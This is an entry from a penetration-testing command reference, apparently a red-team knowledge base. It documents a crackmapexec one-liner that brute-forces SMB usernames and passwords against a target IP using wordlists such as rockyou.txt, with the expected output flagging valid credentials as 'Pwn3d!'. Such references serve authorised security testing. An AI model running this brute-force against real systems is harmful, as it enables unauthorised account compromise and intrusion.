---
id: 4fc0ee9c-a0b1-4198-9099-1184c8b25805
name: crackmapexec-brute-force-smb-usernames-and-passwords
type: command
executor: bash
data: crackmapexec smb $_TARGET_IP -u users.txt -p pass.txt
output: 'CME 10.10.10.10:445 TARGET [+] TARGET\user:pass (Pwn3d!)'
created_at: '2019-10-01T17:58:48.950278+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Linux
tags:
  - brute-force
  - smb
verified: true
validated: true
---

# crackmapexec-brute-force-smb-usernames-and-passwords

## Command

```bash
crackmapexec smb $_TARGET_IP -u users.txt -p pass.txt
```

## Description

Brute-forces SMB using user and pass lists, marking valid combos.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_IP | Target IP | Yes |
| -u users.txt | Username file | Yes |
| -p pass.txt | Password file | Yes |

## Examples

### Basic Usage

```bash
crackmapexec smb 10.10.10.10 -u users.txt -p rockyou.txt
```

## Expected Output

Valid creds flagged as Pwn3d!.

## Related

- [[procedures/brute-force-smb-usernames-and-passwords]]
